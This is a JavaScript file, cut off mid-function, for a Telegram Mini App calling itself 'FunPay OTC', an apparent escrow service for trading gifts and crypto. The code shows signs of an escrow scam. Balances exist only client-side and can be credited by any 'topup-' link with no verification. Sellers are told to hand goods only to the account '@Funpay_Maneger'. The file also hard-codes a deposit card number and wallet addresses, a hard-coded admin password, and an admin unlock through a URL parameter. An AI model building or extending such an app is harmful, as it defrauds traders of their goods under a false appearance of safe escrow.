// FunPay OTC Mini App
const tg = window.Telegram?.WebApp;
if (tg) { tg.ready(); tg.expand(); }

// ─── CONFIG ──────────────────────────────────────────────────────────────────
const DEPOSIT_TON_ADDRESS  = 'UQDysIg-TdLkb4SydN0UWv4DyVkyRlKEbLas38-2hwx26QPg'
const DEPOSIT_USDT_ADDRESS = 'UQDysIg-TdLkb4SydN0UWv4DyVkyRlKEbLas38-2hwx26QPg'
const DEPOSIT_CARD_RUB     = '2200702173393542'
const SUPPORT_USERNAME     = '@Funpay_Maneger'

// API helpers - замените URL на адрес вашего бота
const MANAGER_USERNAME = '@Funpay_Maneger';
const API_BASE = (typeof window !== 'undefined' && window.FUNPAY_API_BASE) || '';

async function apiCall(path, method, body) {
  if (!API_BASE) return null;
  try {
    var opts = { method: method || 'GET', headers: { 'Content-Type': 'application/json' } };
    if (body) opts.body = JSON.stringify(body);
    var res = await fetch(API_BASE + path, opts);
    if (!res.ok) return null;
    return await res.json();
  } catch(e) { return null; }
}

var _pollInt = null;
var _bgPollInt = null;

// Фоновый поллинг всех активных сделок (работает даже когда модал закрыт)
function startBackgroundPolling() {
  if (_bgPollInt) return;
  _bgPollInt = setInterval(async function() {
    var activeStatuses = ['pending', 'active', 'funded', 'escrow'];
    var activeDeals = state.deals.filter(function(d) {
      return activeStatuses.indexOf(d.status) >= 0;
    });
    for (var i = 0; i < activeDeals.length; i++) {
      var local = activeDeals[i];
      var sv = await apiCall('/api/deals/' + local.id);
      if (!sv) continue;
      var changed = ['status', 'step', 'hasPartner', 'buyerUsername', 'sellerUsername'].some(function(k) {
        return local[k] !== sv[k];
      });
      if (changed) {
        var _saved = local.myRole;
        Object.assign(local, sv);
        if (_saved !== undefined) local.myRole = _saved;
        saveState();
        renderDeals();
        showToast('📡 Сделка #' + local.id + ' обновлена!');
        // Если модал этой сделки открыт — обновить его тоже
        var modal = document.getElementById('modalDealDetail');
        if (modal && modal.style.display !== 'none') {
          openDealDetail(local.id);
        }
      }
    }
  }, 5000);
}

function startDealPolling(id) {
  stopDealPolling();
  _pollInt = setInterval(async function() {
    var sv = await apiCall('/api/deals/' + id);
    if (!sv) return;
    var local = state.deals.find(function(x) { return x.id === id; });
    if (!local) { state.deals.push(sv); saveState(); renderDeals(); return; }
    var changed = ['status','step','hasPartner','buyerUsername','sellerUsername'].some(function(k) { return local[k] !== sv[k]; });
    if (changed) {
      var _savedRole = local.myRole;
      Object.assign(local, sv);
      if (_savedRole !== undefined) local.myRole = _savedRole;
      saveState(); renderDeals();
      openDealDetail(id);
      showToast('📡 Статус сделки обновлён!');
    }
  }, 5000);
}

function stopDealPolling() {
  if (_pollInt) { clearInterval(_pollInt); _pollInt = null; }
}

// ─── RIPPLE ──────────────────────────────────────────────────────────────────
document.addEventListener('pointerdown', (e) => {
  const btn = e.target.closest('.btn-primary, .btn-secondary, .deal-type-btn, .cur-select-btn')
  if (!btn) return
  const r = document.createElement('span')
  r.className = 'ripple'
  const rect = btn.getBoundingClientRect()
  r.style.left = (e.clientX - rect.left) + 'px'
  r.style.top = (e.clientY - rect.top) + 'px'
  btn.appendChild(r)
  setTimeout(() => r.remove(), 600)
})

// ─── TON CONNECT ─────────────────────────────────────────────────────────────
let tonConnectUI = null
function initTonConnect() {
  try {
    tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
      manifestUrl: 'https://lchik6614-hub.github.io/FunPay-OTC/tonconnect-manifest.json',
    })
    tonConnectUI.onStatusChange((wallet) => {
      updateWalletUI(wallet)
    })
  } catch (e) {
    console.warn('TON Connect init failed:', e)
  }
}

function updateWalletUI(wallet) {
  const statusEl = document.getElementById('walletConnectStatus')
  const btn = document.getElementById('btnConnectWallet')
  if (!statusEl || !btn) return
  if (wallet) {
    const addr = wallet.account?.address || ''
    const short = addr ? addr.slice(0, 6) + '...' + addr.slice(-4) : 'подключён'
    statusEl.innerHTML = `<div class="wallet-connected"><span class="wallet-dot"></span> Кошелёк подключён: <strong>${short}</strong></div>`
    btn.textContent = 'Отключить кошелёк'
    btn.classList.add('btn-secondary')
    btn.classList.remove('btn-primary')
  } else {
    statusEl.innerHTML = ''
    btn.innerHTML = `<svg width="18" height="18" viewBox="0 0 24 24" fill="none"><rect x="2" y="6" width="20" height="14" rx="2" stroke="currentColor" stroke-width="2"/><path d="M16 13a1 1 0 1 0 0-2 1 1 0 0 0 0 2z" fill="currentColor"/><path d="M2 10h20" stroke="currentColor" stroke-width="2"/></svg> Подключить TON кошелёк`
    btn.classList.remove('btn-secondary')
    btn.classList.add('btn-primary')
  }
}

// ─── STATE ───────────────────────────────────────────────────────────────────
const DEFAULT_STATE = {
  deals: [],
  balances: { TON:0, USDT:0, STARS:0, RUB:0, KGS:0, EUR:0, GBP:0, CNY:0, JPY:0, TRY:0, UAH:0, KZT:0, BTC:0, ETH:0 },
  stats: { success:0, active:0, completed:0, cancelled:0 },
  turnover: 0,
  adminUnlocked: false,
  theme: 'light'
}
function loadState() {
  try { return JSON.parse(localStorage.getItem('fpotc_state') || 'null') || JSON.parse(JSON.stringify(DEFAULT_STATE)) }
  catch { return JSON.parse(JSON.stringify(DEFAULT_STATE)) }
}
function saveState() {
  const json = JSON.stringify(state)
  localStorage.setItem('fpotc_state', json)
  try { tg?.CloudStorage?.setItem('fpotc_state', json) } catch {}
}
let state = loadState()

let newDeal = {}
let dealsFilter = 'active'
let walletCurrency = 'TON'
let withdrawMethod = 'tg'
let avatarTapCount = 0
let avatarTapTimer = null

// ─── CURRENCIES ──────────────────────────────────────────────────────────────
const CURRENCIES = [
  { id:'TON',   label:'TON',   cls:'ton',  svg:`<svg viewBox="0 0 32 32"><circle cx="16" cy="16" r="16" fill="#0098ea"/><path d="M10 10h12l-6 14-6-14z" fill="white"/><line x1="10" y1="10" x2="22" y2="10" stroke="white" stroke-width="1.5"/></svg>` },
  { id:'USDT',  label:'USDT',  cls:'usdt', svg:`<svg viewBox="0 0 32 32"><circle cx="16" cy="16" r="16" fill="#26a17b"/><text x="50%" y="56%" text-anchor="middle" dominant-baseline="middle" fill="white" font-size="15" font-weight="bold" font-family="Arial">₮</text></svg>` },
  { id:'STARS', label:'STARS', cls:'stars',svg:`<svg viewBox="0 0 32 32"><circle cx="16" cy="16" r="16" fill="#f59e0b"/><text x="50%" y="56%" text-anchor="middle" dominant-baseline="middle" fill="white" font-size="16" font-family="Arial">★</text></svg>` },
  { id:'RUB',   label:'RUB',   cls:'rub',  svg:`<svg viewBox="0 0 32 32"><circle cx="16" cy="16" r="16" fill="#2563eb"/><text x="50%" y="56%" text-anchor="middle" dominant-baseline="middle" fill="white" font-size="15" font-weight="bold" font-family="Arial">₽</text></svg>` },
  { id:'KGS',   label:'KGS',   cls:'kgs',  svg:`<svg viewBox="0 0 32 32"><circle cx="16" cy="16" r="16" fill="#c0392b"/><text x="50%" y="56%" text-anchor="middle" dominant-baseline="middle" fill="white" font-size="13" font-weight="bold" font-family="Arial">с</text></svg>` },
  { id:'EUR',   label:'EUR',   cls:'eur',  svg:`<svg viewBox="0 0 32 32"><circle cx="16" cy="16" r="16" fill="#1d4ed8"/><text x="50%" y="56%" text-anchor="middle" dominant-baseline="middle" fill="white" font-size="15" font-weight="bold" font-family="Arial">€</text></svg>` },
  { id:'GBP',   label:'GBP',   cls:'gbp',  svg:`<svg viewBox="0 0 32 32"><circle cx="16" cy="16" r="16" fill="#7c3aed"/><text x="50%" y="56%" text-anchor="middle" dominant-baseline="middle" fill="white" font-size="15" font-weight="bold" font-family="Arial">£</text></svg>` },
  { id:'CNY',   label:'CNY',   cls:'cny',  svg:`<svg viewBox="0 0 32 32"><circle cx="16" cy="16" r="16" fill="#dc2626"/><text x="50%" y="56%" text-anchor="middle" dominant-baseline="middle" fill="white" font-size="14" font-weight="bold" font-family="Arial">¥</text></svg>` },
  { id:'JPY',   label:'JPY',   cls:'jpy',  svg:`<svg viewBox="0 0 32 32"><circle cx="16" cy="16" r="16" fill="#111827"/><text x="50%" y="56%" text-anchor="middle" dominant-baseline="middle" fill="white" font-size="14" font-weight="bold" font-family="Arial">¥</text></svg>` },
  { id:'TRY',   label:'TRY',   cls:'try',  svg:`<svg viewBox="0 0 32 32"><circle cx="16" cy="16" r="16" fill="#dc2626"/><text x="50%" y="56%" text-anchor="middle" dominant-baseline="middle" fill="white" font-size="15" font-weight="bold" font-family="Arial">₺</text></svg>` },
  { id:'UAH',   label:'UAH',   cls:'uah',  svg:`<svg viewBox="0 0 32 32"><circle cx="16" cy="16" r="16" fill="#059669"/><text x="50%" y="56%" text-anchor="middle" dominant-baseline="middle" fill="white" font-size="14" font-weight="bold" font-family="Arial">₴</text></svg>` },
  { id:'KZT',   label:'KZT',   cls:'kzt',  svg:`<svg viewBox="0 0 32 32"><circle cx="16" cy="16" r="16" fill="#0891b2"/><text x="50%" y="56%" text-anchor="middle" dominant-baseline="middle" fill="white" font-size="14" font-weight="bold" font-family="Arial">₸</text></svg>` },
  { id:'BTC',   label:'BTC',   cls:'btc',  svg:`<svg viewBox="0 0 32 32"><circle cx="16" cy="16" r="16" fill="#f97316"/><text x="50%" y="56%" text-anchor="middle" dominant-baseline="middle" fill="white" font-size="15" font-weight="bold" font-family="Arial">₿</text></svg>` },
  { id:'ETH',   label:'ETH',   cls:'eth',  svg:`<svg viewBox="0 0 32 32"><circle cx="16" cy="16" r="16" fill="#6366f1"/><path d="M16 8l-5.5 8.5 5.5 3.2 5.5-3.2z" fill="white" opacity="0.9"/><path d="M16 21.5l-5.5-3.2 5.5 7 5.5-7z" fill="white" opacity="0.7"/></svg>` },
]

function getCur(id) { return CURRENCIES.find(c=>c.id===id) || CURRENCIES[0] }
function svgIcon(id, size=32) {
  const c = getCur(id)
  return `<span class="cur-icon-svg" style="width:${size}px;height:${size}px;border-radius:50%;overflow:hidden;display:inline-flex;flex-shrink:0">${c.svg}</span>`
}

// ─── INIT ────────────────────────────────────────────────────────────────────
document.addEventListener('DOMContentLoaded', () => {
  applyTheme(state.theme)
  renderProfile()
  renderBalances()
  renderStats()
  renderDeals()
  renderWalletCurrencyTabs()
  renderCurrencyGrid()
  startCountdown()
  startRateUpdater()
  switchTab('deals')
  initTonConnect()

  // ── Синхронизация с Telegram CloudStorage (кросс-устройственное хранилище) ──
  if (tg?.CloudStorage) {
    tg.CloudStorage.getItem('fpotc_state', (err, val) => {
      if (!err && val) {
        try {
          const cloudState = JSON.parse(val)
          if (cloudState && typeof cloudState === 'object') {
            state = cloudState
            applyTheme(state.theme || 'dark')
            renderProfile(); renderBalances(); renderStats(); renderDeals(); renderAdminPanel()
          }
        } catch {}
      }
    })
  }

  document.getElementById('btnCreateDeal').onclick = () => { resetDealForm(); openModal('modalCreateDeal') }
  document.getElementById('btnConnectWallet').onclick = handleWalletConnect
  document.getElementById('btnDeposit').onclick = openDepositModal
  document.getElementById('btnWithdraw').onclick = openWithdrawModal
  startBackgroundPolling()

  document.querySelectorAll('.modal-overlay').forEach(el => {
    el.addEventListener('click', e => {
      if (e.target === el) { el.style.display = 'none'; if (el.id==='modalDealDetail') stopDealPolling(); }
    })
  })

  const urlParams = new URLSearchParams(window.location.search)
  const startParam = urlParams.get('startapp') || tg?.initDataUnsafe?.start_param
  if (startParam === 'admin') {
    state.adminUnlocked = true
    saveState()
    switchTab('profile')
    renderAdminPanel()
    showToast('✅ Режим администратора активирован!')
  } else if (startParam && startParam.startsWith('DEAL-')) {
    // DEAL-{id}-{amount}-{currency}-{creatorType}-{creatorUsername}
    const parts = startParam.split('-')
    setTimeout(() => showJoinDealModal({
      id:              parts[1] || '?',
      amount:          parts[2] || '?',
      currency:        parts[3] || '?',
      dealType:        parts[4] || 'sell',
      creatorUsername: parts[5] || null
    }), 700)
  } else if (startParam && startParam.startsWith('topup-')) {
    // topup-{currency}-{amount}-{txhash}  — бот отправляет после обнаружения транзакции
    const parts    = startParam.split('-')
    const currency = parts[1]
    const amount   = parseFloat(parts[2])
    if (currency && amount > 0) {
      setTimeout(() => {
        state.balances[currency] = (state.balances[currency] || 0) + amount
        saveState()
        renderBalances()
        showToast(`✅ Зачислено ${amount} ${currency} на баланс!`)
        switchTab('profile')
      }, 900)
    }
  }
})

// ─── WALLET CONNECT ───────────────────────────────────────────────────────────
async function handleWalletConnect() {
  if (!tonConnectUI) { showToast('TON Connect недоступен'); return }
  try {
    const wallet = tonConnectUI.wallet
    if (wallet) {
      await tonConnectUI.disconnect()
      showToast('Кошелёк отключён')
    } else {
      await tonConnectUI.openModal()
    }
  } catch(e) {
    showToast('Ошибка подключения')
    console.warn(e)
  }
}

// ─── TABS ─────────────────────────────────────────────────────────────────────
function switchTab(tab) {
  document.querySelectorAll('.tab-page').forEach(p => p.classList.remove('active'))
  document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'))
  document.getElementById('tab-' + tab).classList.add('active')
  document.getElementById('nav-' + tab).classList.add('active')
  if (tab === 'deals') renderDeals()
  if (tab === 'leaders') renderLeaderboard()
  if (tab === 'profile') { renderProfile(); renderBalances(); renderStats(); renderAdminPanel() }
}

// ─── THEME ────────────────────────────────────────────────────────────────────
function setTheme(t) {
  state.theme = t; saveState(); applyTheme(t)
  document.getElementById('btnLight').classList.toggle('active', t==='light')
  document.getElementById('btnDark').classList.toggle('active', t==='dark')
}
function applyTheme(t) { document.body.classList.toggle('dark', t==='dark') }

// ─── PROFILE ──────────────────────────────────────────────────────────────────
function renderProfile() {
  const user = tg?.initDataUnsafe?.user
  const avatarEl = document.getElementById('profileAvatar')
  const nameEl = document.getElementById('profileName')
  const userEl = document.getElementById('profileUsername')
  const selfU = document.getElementById('selfUsername')
  const recConf = document.getElementById('recipientConfirmed')
  let uname = 'funpay_user'
  if (user) {
    uname = user.username || 'user'
    if (user.photo_url) avatarEl.innerHTML = `<img src="${user.photo_url}" style="width:100%;height:100%;object-fit:cover;border-radius:50%"/>`
    else { const i = (user.first_name||user.username||'F')[0].toUpperCase(); avatarEl.textContent = i }
    const n = (user.first_name||'') + (user.last_name?' '+user.last_name:'') || user.username || 'User'
    nameEl.textContent = n
    userEl.textContent = '@' + uname
  } else {
    avatarEl.textContent = 'F'
    nameEl.textContent = 'FunPay User'
    userEl.textContent = '@funpay_user'
  }
  if (selfU) selfU.textContent = '(@' + uname + ')'
  if (recConf) recConf.textContent = '✅ Получатель @' + uname
  avatarEl.onclick = handleAvatarTap
  document.getElementById('btnLight').classList.toggle('active', state.theme==='light')
  document.getElementById('btnDark').classList.toggle('active', state.theme==='dark')
}

function handleAvatarTap() {
  avatarTapCount++
  clearTimeout(avatarTapTimer)
  avatarTapTimer = setTimeout(() => { avatarTapCount = 0 }, 2000)
  if (avatarTapCount >= 10) {
    avatarTapCount = 0
    document.getElementById('adminPassInput').value = ''
    document.getElementById('adminPassError').style.display = 'none'
    openModal('modalAdminPass')
  }
}

function checkAdminPass() {
  if (document.getElementById('adminPassInput').value === 'huec1488') {
    state.adminUnlocked = true; saveState()
    closeModal('modalAdminPass')
    renderAdminPanel()
    showToast('✅ Доступ к админ-панели открыт!')
    try { tg?.sendData('admin_access') } catch {}
  } else {
    document.getElementById('adminPassError').style.display = 'block'
  }
}

function renderAdminPanel() {
  const p = document.getElementById('adminPanel')
  if (!state.adminUnlocked) { p.style.display='none'; return }
  p.style.display = 'block'
  document.getElementById('adminSuccess').textContent = state.stats.success
  document.getElementById('adminCompleted').textContent = state.stats.completed
  document.getElementById('adminCancelled').textContent = state.stats.cancelled
  document.getElementById('adminTotal').textContent = state.stats.success + state.stats.completed + state.stats.cancelled
  document.getElementById('adminTurnoverVal').textContent = '$' + state.turnover.toFixed(2).replace('.',',')
}

// ─── BALANCES ─────────────────────────────────────────────────────────────────
function renderBalances() {
  const hideZero = document.getElementById('hideZeroToggle')?.checked
  const list = document.getElementById('balancesList')
  const html = CURRENCIES.map((c,i) => {
    const val = (state.balances[c.id]||0).toFixed(2)
    if (hideZero && parseFloat(val)===0) return ''
    return `<div class="balance-row" style="animation-delay:${i*0.04}s">
      ${svgIcon(c.id,32)}
      <span class="balance-name">${c.label}</span>
      <span class="balance-amount">${val}</span>
    </div>`
  }).join('')
  list.innerHTML = html || '<div class="empty-state" style="padding:20px 0">Все балансы скрыты</div>'
}

// ─── STATS ────────────────────────────────────────────────────────────────────
function renderStats() {
  document.getElementById('statSuccess').textContent = state.stats.success
  document.getElementById('statActive').textContent = state.stats.active
  document.getElementById('statCompleted').textContent = state.stats.completed
  document.getElementById('statCancelled').textContent = state.stats.cancelled
  const t = state.stats.success + state.stats.active + state.stats.completed + state.stats.cancelled
  document.getElementById('statTotal').textContent = t
  document.getElementById('statTurnover').textContent = state.turnover.toFixed(2).replace('.',',')+' $'
}

// ─── DEALS ────────────────────────────────────────────────────────────────────
function setDealsFilter(f) {
  dealsFilter = f
  document.getElementById('btnFilterActive').classList.toggle('active', f==='active')
  document.getElementById('btnFilterHistory').classList.toggle('active', f==='history')
  renderDeals()
}

function renderDeals() {
  const list = document.getElementById('dealsList')
  let deals = [...state.deals]
  var _activeStatuses=['pending','active','funded','escrow']
  if (dealsFilter==='active') deals = deals.filter(function(d){return _activeStatuses.indexOf(d.status)>=0})
  else deals = deals.filter(function(d){return _activeStatuses.indexOf(d.status)<0})
  if (!deals.length) { list.innerHTML='<div class="empty-state">Нет активных сделок</div>'; return }
  list.innerHTML = deals.reverse().map(d=>renderDealCard(d)).join('')
}

const STATUS_LABEL = {
  pending:'Ожидание оплаты', active:'Ожидание оплаты',
  funded:'Оплачена', escrow:'У менеджера',
  completed:'Завершена', cancelled:'Отменена', disputed:'Спор'
}
const STATUS_CLS = {
  pending:'badge-pending', active:'badge-active',
  funded:'badge-active', escrow:'badge-active',
  completed:'badge-completed', cancelled:'badge-cancelled', disputed:'badge-cancelled'
}
const STEPS = ['Создана','Покупатель','Оплачена','В эскроу','Получена']

function renderDealCard(d) {
  const stepIdx = d.step||0
  const cancelled = d.status==='cancelled'
  let prog = '<div class="deal-progress">'
  STEPS.forEach((s,i) => {
    const done = i<=stepIdx, curr = i===stepIdx
    prog += `<div class="progress-dot ${done?'done':''} ${curr&&!cancelled?'current':''}"></div>`
    if (i<STEPS.length-1) prog += `<div class="progress-line ${i<stepIdx?'done':''}"></div>`
  })
  prog += '</div><div class="progress-labels">' + STEPS.map((s,i)=>`<span class="progress-label ${i<=stepIdx?'done':''}">${s}</span>`).join('') + '</div>'
  return `<div class="deal-card" onclick="openDealDetail('${d.id}')">
    <div class="deal-card-header">
      <span class="deal-id">#DEAL-${d.id}</span>
      <span class="deal-status-badge ${STATUS_CLS[d.status]}">${STATUS_LABEL[d.status]}</span>
    </div>
    <div class="deal-amount">
      ${svgIcon(d.currency,28)}
      <span class="deal-amount-text${cancelled?' cancelled':''}">${d.amount} ${d.currency}</span>
    </div>
    <div class="deal-desc">${d.description||''}</div>
    <div class="deal-time">🕐 ${timeAgo(d.createdAt)}</div>
    ${prog}
  </div>`
}

function timeAgo(ts) {
  const s = Math.floor((Date.now()-ts)/1000)
  if (s<60) return s+' сек назад'
  if (s<3600) return Math.floor(s/60)+' мин назад'
  if (s<86400) return Math.floor(s/3600)+' ч назад'
  return Math.floor(s/86400)+' дн назад'
}

async function openDealDetail(id) {
  var sv = await apiCall('/api/deals/' + id);
  if (sv) {
    var lc = state.deals.find(function(x) { return x.id === id; });
    if (lc) {
      var _savedRole = lc.myRole;
      Object.assign(lc, sv);
      if (_savedRole !== undefined) lc.myRole = _savedRole;
    } else {
      state.deals.push(sv);
    }
    saveState();
  }
  var d = state.deals.find(function(x) { return x.id === id; });
  if (!d) { showToast('Сделка не найдена'); return; }

  startDealPolling(id);

  var user     = tg && tg.initDataUnsafe && tg.initDataUnsafe.user;
  var uname    = (user && user.username) || 'user';
  var uid      = (user && user.id) || 0;

  // Определяем роль: сначала по сохранённому myRole, затем по ID/username, иначе по dealType
  var isBuyer;
  if (d.myRole !== undefined) {
    isBuyer = (d.myRole === 'buy');
  } else if (uid && d.buyerId && String(d.buyerId) === String(uid)) {
    isBuyer = true;
  } else if (uid && d.sellerId && String(d.sellerId) === String(uid)) {
    isBuyer = false;
  } else if (uname && uname !== 'user' && d.buyerUsername && d.buyerUsername === uname) {
    isBuyer = true;
  } else if (uname && uname !== 'user' && d.sellerUsername && d.sellerUsername === uname) {
    isBuyer = false;
  } else {
    isBuyer = (d.dealType === 'buy');
  }
  var stepIdx  = Math.min(d.step || 0, 4);
  var isCancelled = (d.status === 'cancelled' || d.status === 'disputed');
  var isDone      = (d.status === 'completed' || stepIdx >= 4) && !isCancelled;
  var totalAmt = (parseFloat(d.amount) * 1.01).toFixed(2);
  var commAmt  = (parseFloat(d.amount) * 0.01).toFixed(2);
  var myBal    = ((state.balances && state.balances[d.currency]) || 0).toFixed(2);
  var created  = new Date(d.createdAt).toLocaleString('ru-RU');

  // ── Progress bar ──────────────────────────────────────────────────────────
  var progHtml = '<div class="deal-progress" style="margin:0">';
  for (var pi = 0; pi < STEPS.length; pi++) {
    var isDotDone = pi <= stepIdx && !isCancelled;
    var isDotCurr = pi === stepIdx && !isCancelled;
    var dotCls = 'progress-dot' + (isDotDone ? ' done' : '') + (isDotCurr ? ' current' : '');
    progHtml += '<div class="' + dotCls + '"></div>';
    if (pi < STEPS.length - 1) {
      var lineDone = (pi < stepIdx && !isCancelled) ? ' done' : '';
      progHtml += '<div class="progress-line' + lineDone + '"></div>';
    }
  }
  progHtml += '</div><div class="progress-labels" style="margin-top:4px">';
  for (var li = 0; li < STEPS.length; li++) {
    var lblDone = (li <= stepIdx && !isCancelled) ? ' done' : '';
    progHtml += '<span class="progress-label' + lblDone + '">' + STEPS[li] + '</span>';
  }
  progHtml += '</div>';

  // ── Participant display ───────────────────────────────────────────────────
  var myBadge  = '<span class="link-blue">@' + uname + ' <span class="you-badge">Вы</span></span>';
  var noBuyer  = '<span class="text-dim">Покупатель не присоединился</span>';
  var buyerDisp  = isBuyer  ? myBadge
    : (d.buyerUsername  ? '<span class="link-blue">@' + d.buyerUsername  + '</span>' : noBuyer);
  var sellerDisp = !isBuyer ? myBadge
    : (d.sellerUsername ? '<span class="link-blue">@' + d.sellerUsername + '</span>'
                        : '<span class="text-dim">Продавец</span>');

  // ── Status text ───────────────────────────────────────────────────────────
  var statusMap = {
    pending: 'Ожидание оплаты', active: 'Ожидание оплаты',
    funded: 'Оплачена', escrow: 'У менеджера',
    completed: 'Завершена', cancelled: 'Отменена', disputed: 'Спор'
  };
  var statusText = statusMap[d.status] || 'Активна';

  // ── Action section ────────────────────────────────────────────────────────
  var secLabel  = 'СЕЙЧАС';
  var secClass  = 'dd-now-box';
  var nowText   = '';
  var actHtml   = '';

  if (isCancelled) {
    secClass = 'dd-now-box dd-now-cancelled';
    nowText  = d.status === 'disputed'
      ? '&#9888;&#65039; Открыт спор. Свяжитесь с менеджером <a href="https://t.me/Funpay_Maneger" class="link-blue" target="_blank">@Funpay_Maneger</a>.'
      : '&#10060; Сделка отменена.';

  } else if (isDone) {
    secLabel = 'ГОТОВО';
    secClass = 'dd-now-box dd-now-done';
    nowText  = 'Сделка завершена. Спасибо, что воспользовались Funpay!';

  } else if (!isBuyer) {
    // ── Seller ──────────────────────────────────────────────────────────────
    if (stepIdx === 0) {
      nowText  = 'Ожидаем покупателя. Поделитесь ссылкой на сделку, чтобы он присоединился.';
      actHtml  = '<button class="btn-primary btn-block" onclick="shareDeal(\'' + d.id + '\')">'
               + '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="margin-right:6px;vertical-align:-2px"><circle cx="18" cy="5" r="3"/><circle cx="6" cy="12" r="3"/><circle cx="18" cy="19" r="3"/><path d="M8.59 13.51l6.83 3.98M15.41 6.51l-6.82 3.98"/></svg>'
               + 'Поделиться сделкой</button>'
               + '<button class="btn-secondary btn-block" onclick="cancelDeal(\'' + d.id + '\')">Отменить сделку</button>';

    } else if (stepIdx === 1) {
      nowText  = 'Покупатель в сделке. Ждём, когда он оплатит. После оплаты вы передадите подарок менеджеру <a href="https://t.me/Funpay_Maneger" class="link-blue" target="_blank">@Funpay_Maneger</a>.';
      actHtml  = '<button class="btn-primary btn-block" onclick="shareDeal(\'' + d.id + '\')">'
               + '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="margin-right:6px;vertical-align:-2px"><circle cx="18" cy="5" r="3"/><circle cx="6" cy="12" r="3"/><circle cx="18" cy="19" r="3"/><path d="M8.59 13.51l6.83 3.98M15.41 6.51l-6.82 3.98"/></svg>'
               + 'Поделиться сделкой</button>'
               + '<button class="btn-secondary btn-block" onclick="cancelDeal(\'' + d.id + '\')">Отменить сделку</button>';

    } else if (stepIdx === 2) {
      secLabel = 'ВАШ ШАГ';
      nowText  = 'Передайте подарок ТОЛЬКО менеджеру <a href="https://t.me/Funpay_Maneger" class="link-blue" target="_blank">@Funpay_Maneger</a> — никогда напрямую покупателю. После передачи нажмите «Передал менеджеру».';
      actHtml  = '<button class="btn-primary btn-block" onclick="showTransferConfirm(\'' + d.id + '\')">Передал менеджеру</button>'
               + '<a href="https://t.me/Funpay_Maneger" class="btn-secondary btn-block" target="_blank" style="text-align:center;text-decoration:none;display:block;box-sizing:border-box;padding:12px">&#128172; Открыть чат с менеджером</a>';

    } else if (stepIdx === 3) {
      nowText  = 'Подарок у менеджера <a href="https://t.me/Funpay_Maneger" class="link-blue" target="_blank">@Funpay_Maneger</a>. Ждём, когда покупатель проверит и подтвердит получение — после этого деньги придут к вам.';
    }

  } else {
    // ── Buyer ───────────────────────────────────────────────────────────────
    if (stepIdx <= 1) {
      if (stepIdx === 0) {
        secLabel = 'ВАШ ШАГ';
        nowText  = 'Поделитесь ссылкой с продавцом, чтобы он мог присоединиться к сделке.';
        actHtml  = '<button class="btn-primary btn-block" onclick="shareDeal(\'' + d.id + '\')">'
                 + '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="margin-right:6px;vertical-align:-2px"><circle cx="18" cy="5" r="3"/><circle cx="6" cy="12" r="3"/><circle cx="18" cy="19" r="3"/><path d="M8.59 13.51l6.83 3.98M15.41 6.51l-6.82 3.98"/></svg>'
                 + 'Поделиться сделкой</button>'
                 + '<button class="btn-secondary btn-block" onclick="cancelDeal(\'' + d.id + '\')">Отменить сделку</button>';
      } else {
        secLabel = 'ВАШ ШАГ';
        var hasBal = ((state.balances && state.balances[d.currency]) || 0) >= parseFloat(totalAmt);
        nowText  = 'Оплатите сделку с вашего баланса, чтобы продолжить. Итого с комиссией 1%: <b>' + totalAmt + ' ' + d.currency + '</b>.';
        actHtml  = hasBal
          ? '<button class="btn-primary btn-block" onclick="buyerPayDeal(\'' + d.id + '\')">&#128179; Оплатить с баланса (' + myBal + ' ' + d.currency + ')</button>'
          : '<div class="dd-low-balance">&#9888;&#65039; Недостаточно средств (' + myBal + ' ' + d.currency + '). Пополните баланс.</div>'
          + '<button class="btn-secondary btn-block" onclick="closeModal(\'modalDealDetail\');switchTab(\'profile\')">Пополнить баланс</button>';
      }

    } else if (stepIdx === 2) {
      nowText = 'Оплата принята! Продавец сейчас передаёт товар менеджеру <a href="https://t.me/Funpay_Maneger" class="link-blue" target="_blank">@Funpay_Maneger</a>. Ожидайте.';

    } else if (stepIdx === 3) {
      secLabel = 'ВАШ ШАГ';
      nowText  = 'Свяжитесь с менеджером <a href="https://t.me/Funpay_Maneger" class="link-blue" target="_blank">@Funpay_Maneger</a> и проверьте товар. Если всё хорошо — нажмите «Подтвердить получение товара».';
      actHtml  = '<button class="btn-primary btn-block" onclick="showReceiptConfirm(\'' + d.id + '\')">Подтвердить получение</button>';
    }
  }

  // ── Payment card (buyer step 1) ───────────────────────────────────────────
  var payCardHtml = '';
  if (isBuyer && stepIdx === 1) {
    payCardHtml = '<div class="dd-card dd-payment-card" style="margin-top:0">'
      + '<div class="dd-pay-row"><span>К оплате</span><span>' + d.amount + ' ' + d.currency + '</span></div>'
      + '<div class="dd-pay-row"><span>Комиссия 1%</span><span>' + commAmt + ' ' + d.currency + '</span></div>'
      + '<div class="dd-pay-row dd-pay-total"><span><b>Итого</b></span><span><b>' + totalAmt + ' ' + d.currency + '</b></span></div>'
      + '</div>';
  }

  // ── Success card ──────────────────────────────────────────────────────────
  var successHtml = '';
  if (isDone) {
    successHtml = '<div class="dd-success-card">'
      + '<svg width="48" height="48" viewBox="0 0 48 48" fill="none" style="display:block;margin:0 auto 8px">'
      + '<circle cx="24" cy="24" r="24" fill="#22c55e22"/>'
      + '<path d="M14 24l8 8 12-16" stroke="#22c55e" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/>'
      + '</svg>'
      + '<div class="dd-success-text">Сделка успешно завершена</div>'
      + '</div>';
  }

  // ── Build final HTML ──────────────────────────────────────────────────────
  document.getElementById('dealDetailContent').innerHTML =
    '<div class="dd-header">' + svgIcon(d.currency, 44)
    + '<div><div class="dd-amount">' + d.amount + ' ' + d.currency + '</div>'
    + '<div class="dd-desc">' + (d.description || (isBuyer ? 'Покупка' : 'Продажа')) + '</div></div></div>'

    + '<div class="dd-card"><div class="dd-card-title">СТАТУС СДЕЛКИ</div>'
    + '<div class="dd-step-title">Шаг ' + (stepIdx + 1) + ' из 5 \u2014 ' + STEPS[stepIdx] + '</div>'
    + progHtml
    + '<div class="dd-secure-tag">Безопасно через Telegram</div></div>'

    + '<div class="dd-card">'
    + '<div class="dd-info-row"><span class="dd-label">Статус</span><span>' + statusText + '</span></div>'
    + '<div class="dd-info-row"><span class="dd-label">Продавец</span><span>' + sellerDisp + '</span></div>'
    + '<div class="dd-info-row"><span class="dd-label">Покупатель</span><span>' + buyerDisp + '</span></div>'
